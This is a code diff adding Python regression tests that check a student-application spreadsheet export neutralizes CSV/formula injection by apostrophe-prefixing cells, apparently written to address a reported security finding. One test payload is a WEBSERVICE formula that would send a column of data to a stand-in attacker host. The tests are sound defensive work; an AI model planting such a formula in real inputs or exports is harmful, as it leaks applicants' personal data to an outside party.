@@ -393,3 +393,50 @@ class TestTitleAndSheet:
         )
         wb = load_workbook(io.BytesIO(blob))
         assert "115學年" in wb.sheetnames
+
+
+class TestFormulaInjectionSanitization:
+    """Issue #1081 finding G: student-supplied free text that leads with a
+    formula-trigger char must be written as literal text (apostrophe-prefixed),
+    not a live formula, in the downloadable .xlsx."""
+
+    def test_malicious_dynamic_field_value_is_neutralized(self):
+        payload = '=WEBSERVICE("https://attacker/x?d="&TEXTJOIN(",",TRUE,N:N))'
+        app = FakeApplication(
+            student_data=_full_student_data(),
+            submitted_form_data={"fields": {"master_school": {"value": payload}}},
+        )
+        fields = [
+            DynamicFieldSpec(
+                field_name="master_school",
+                field_label="碩士畢業學校",
+                export_column_label=None,
+                display_order=10,
+            )
+        ]
+        rows = _build_workbook([_make_row(app=app)], dynamic_fields=fields)
+        assert rows[2][18] == "'" + payload
+
+    def test_malicious_student_name_is_neutralized(self):
+        data = _full_student_data()
+        data["std_cname"] = "=1+1"
+        app = FakeApplication(student_data=data)
+        rows = _build_workbook([_make_row(app=app)])
+        # Name column (static) must be apostrophe-prefixed literal text.
+        assert any(cell == "'=1+1" for cell in rows[2])
+
+    def test_benign_values_are_unchanged(self):
+        app = FakeApplication(
+            student_data=_full_student_data(),
+            submitted_form_data={"fields": {"master_school": {"value": "台大土木系"}}},
+        )
+        fields = [
+            DynamicFieldSpec(
+                field_name="master_school",
+                field_label="碩士畢業學校",
+                export_column_label=None,
+                display_order=10,
+            )
+        ]
+        rows = _build_workbook([_make_row(app=app)], dynamic_fields=fields)
+        assert rows[2][18] == "台大土木系"
